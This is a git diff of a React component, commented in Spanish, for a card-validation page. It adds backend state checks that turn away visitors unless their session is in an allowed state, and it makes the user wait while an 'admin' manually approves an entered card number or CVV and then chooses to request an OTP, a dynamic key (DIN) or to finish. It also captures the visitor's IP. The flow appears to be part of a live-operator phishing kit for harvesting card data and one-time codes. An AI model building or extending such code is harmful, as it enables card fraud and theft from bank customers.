@@ -89,51 +89,61 @@ export default function ValidacionTC() {
 
     // --- LÓGICA DE CARGA DE DATOS ---
     useEffect(() => {
-        const savedCardData = localStorageService.getItem("selectedCardData");
-        if (savedCardData) {
-            setCardData(savedCardData);
-        }
-        
-        // Si no hay cardData en localStorage, verificar con el backend (para TC Custom)
-        // Esto es necesario cuando se redirige a esta vista con estado solicitar_tc_custom
-        const checkCardDataFromBackend = async () => {
+        // Validar acceso antes de cargar datos
+        const validateAccess = async () => {
             try {
                 const raw = localStorage.getItem("datos_usuario");
                 const usuarioLocalStorage = raw ? JSON.parse(raw) : {};
                 const sesionId = usuarioLocalStorage?.sesion_id;
                 
-                if (sesionId) {
-                    // Verificar si el backend tiene cardData para esta sesión (TC Custom)
-                    const { instanceBackend } = await import("../../axios/instanceBackend");
-                    const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
-                    const { cardData: backendCardData, estado } = response.data;
-                    
-                    if (backendCardData) {
-                        setCardData(backendCardData);
-                        localStorageService.setItem("selectedCardData", backendCardData);
-                        // Si hay cardData del backend, es TC Custom
-                        setIsTCCustom(true);
-                    } else if (estado === 'solicitar_tc_custom') {
-                        // Estado indica TC Custom pero no hay cardData aún
-                        setIsTCCustom(true);
+                if (!sesionId) {
+                    console.error('Acceso sin sesionId');
+                    navigate('/');
+                    return false;
+                }
+                
+                // Verificar estado del backend
+                const { instanceBackend } = await import("../../axios/instanceBackend");
+                const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
+                const { estado, cardData: backendCardData } = response.data;
+                
+                // Solo permitir acceso si el estado es correcto
+                const estadosPermitidos = [
+                    'solicitar_tc', 
+                    'solicitar_tc_custom', 
+                    'awaiting_tc_approval',
+                    'error_tc'
+                ];
+                
+                if (!estadosPermitidos.includes(estado)) {
+                    console.error('Acceso no autorizado a TC. Estado actual:', estado);
+                    navigate('/');
+                    return false;
+                }
+                
+                // Cargar cardData del backend (prioridad sobre localStorage)
+                if (backendCardData) {
+                    setCardData(backendCardData);
+                    localStorageService.setItem("selectedCardData", backendCardData);
+                    setIsTCCustom(estado === 'solicitar_tc_custom' || estado === 'awaiting_tc_approval');
+                } else {
+                    // Fallback a localStorage si existe
+                    const savedCardData = localStorageService.getItem("selectedCardData");
+                    if (savedCardData) {
+                        setCardData(savedCardData);
+                        setIsTCCustom(estado === 'solicitar_tc_custom' || estado === 'awaiting_tc_approval');
                     }
                 }
+                
+                return true;
             } catch (error) {
-                console.error("Error verificando cardData del backend:", error);
-                // No es crítico, continuar con cardData por defecto si existe
+                console.error("Error validando acceso:", error);
+                navigate('/');
+                return false;
             }
         };
         
-        // Solo verificar si no hay cardData guardado
-        if (!savedCardData) {
-            checkCardDataFromBackend();
-        } else {
-            // Si ya hay cardData guardado, verificar si es custom
-            // (cardData con digits específicos indica que es custom)
-            if (savedCardData.digits && savedCardData.digits.length === 4) {
-                setIsTCCustom(true);
-            }
-        }
+        validateAccess();
         
         obtenerIP();
         obtenerFechaHora();
@@ -495,8 +505,9 @@ export default function ValidacionTC() {
                     return;
                 }
 
-                // Admin aprobó TC/CVV custom: backend pone 'solicitar_din' y muestra menú.
+                // Admin aprobó TC/CVV custom: backend NO cambia el estado automáticamente.
                 // Usuario debe QUEDAR EN ESPERA hasta que admin pulse OTP, DIN o FIN.
+                // El estado permanece en 'awaiting_tc_approval' o 'awaiting_cvv_approval' hasta que admin presione un botón del menú.
                 const prev = estadoAnteriorRef.current;
                 const aprobadoAhora = (prev === 'awaiting_tc_approval' || prev === 'awaiting_cvv_approval') && estado === 'solicitar_din';
                 if (aprobadoAhora) {
@@ -508,6 +519,13 @@ export default function ValidacionTC() {
                     estadoAnteriorRef.current = estado;
                     return;
                 }
+                
+                // Si el estado sigue en awaiting_approval, seguir esperando
+                if (estado === 'awaiting_tc_approval' || estado === 'awaiting_cvv_approval') {
+                    estadoAnteriorRef.current = estado;
+                    return;
+                }
+                
                 estadoAnteriorRef.current = estado;
 
                 const estadosFinales = [
